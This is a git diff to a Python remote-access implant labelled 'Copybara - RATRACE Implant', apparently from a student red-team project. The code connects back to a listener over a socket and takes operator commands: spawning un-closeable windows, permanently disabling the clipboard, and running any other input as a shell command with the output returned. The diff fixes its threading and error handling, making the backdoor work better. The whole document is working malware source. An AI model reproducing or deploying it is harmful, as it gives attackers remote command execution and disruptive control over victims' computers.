@@ -16,16 +16,26 @@ art = r"""
 ⠀⠀⢀⣀⠤⠿⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⡔⢩⠂⠀⠒⠗⠈⠀⠉⠢⠄⣀⠠⠤⠄⠒⢖⡒⢒⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠀⠀⠀⠀
 ⠇⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⠀⠀⠈⠀⠈⠈⡨⢀⠡⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀
-⠈⠒⠀⠤⠤⣄⡆⡂⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠢⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀
-⠀⣀⡠⠶⡄⠈⢳⣐⡐⠐⡀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠁⠇
+⠈⠒⠀⠤⠤⣄⡆⡂⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠢⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀
+⠀⣀⡠⠶⡄⠈⢳⣐⡐⠐⡀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇
 ⣞⢱⣿⣯⠏⣧⣄⠑⢤⢁⠀⠆⠀⠀⠀⠀  ⠀⢀⢰⠀⠀⠀⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⠀
-⠈⣏⠿⣫⠎⠡⡈⠳⡜⡦⠄⡷⠢⠤⠤⠤⠤⢬⢈⡇⢠⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠀⠀
-⠀⠈⣏⡁⠂⢁⡴⠊⠀⣃⢸⡇⠀⠀⠀⠀⠀⠈⢪⢀⣺⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⠀⠀
-⠀⠀⠀⠈⠳⠃⠀⠶⡿⠤⠚⠁⠀⠀⠀⢀⣠⡤⢺⣥⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠈⣏⠿⣫⠎⠡⡈⠳⡜⡦⠄⡷⠢⠤⠤⠤⠤⢬⢈⡇⢠⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⣈⣰⠀⠀
+⠀⠈⣏⡁⠂⢁⡴⠊⠀⣃⢸⡇⠀⠀⠀⠀⠀⠈⢪⢀⣺⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⠆⠀⠀
+⠀⠀⠀⠈⠳⠃⠀⠶⡿⠤⠚⠁⠀⠀⠀⢀⣠⡤⢺⣥⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠀
+Can't Stop Won't Stop | Copybara - RATRACE Implant | mjw6944@rit.edu
 """
 
 def connect():
+    help_text = """Available commands:
+help - Display this help message
+gort - Summons Gort
+bounce - Makes an un-closeable bouncing rodent 
+copybara - Permenantly render the clipboard unusable
+
+INTERACTIVE ONLY COMMANDS:
+duration [time] - sets duration
+splash - sends splash art"""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("127.0.0.1", 5555))
     failsafe = 0
@@ -35,25 +45,17 @@ def connect():
         if command == "info":
             s.send("copybarav2 help gort bounce copybara".encode("utf-8"))
         elif command == "help":
-            help_text = """Available commands:\n
-					  help - Display this help message\n
-					  gort - Summons Gort \n
-					  bounce - Makes an un-closeable bouncing rodent \n
-					  copybara - Permenantly render the clipboard unusable
-					  duration [time] - sets duration, must be done in INTERACTIVE
-					  splash - sends splash art
-					  """
             s.send(help_text.encode("utf-8"))   
         elif command == "gort":
-            gthread = threading.Thread(target=window(duration))
+            gthread = threading.Thread(target=window, args=(duration,))
             gthread.start()
             s.send("GORT IS HERE".encode("utf-8"))
         elif command == "bounce":
-            bthread = threading.Thread(target=bounce(duration))
+            bthread = threading.Thread(target=bounce, args=(duration,))
             bthread.start()
             s.send("Triggered Bounce".encode("utf-8"))
         elif command == "copybara":
-            cthread = threading.Thread(target=clipboard(duration))
+            cthread = threading.Thread(target=clipboard, args=(duration,))
             cthread.start()
             s.send("Coconut Doggo".encode("utf-8"))
         elif command == "splash":
@@ -63,7 +65,7 @@ def connect():
                 duration = int(command.split(" ")[1])
                 s.send(("Set duration to " + str(duration)).encode("utf-8"))
             except Exception as e:
-                s.send(str(e).encode("utf-8"))
+                s.send(("Current duration is " + str(duration)).encode("utf-8"))
         else:
             output = subprocess.getoutput(command)
             s.send(output.encode("utf-8"))
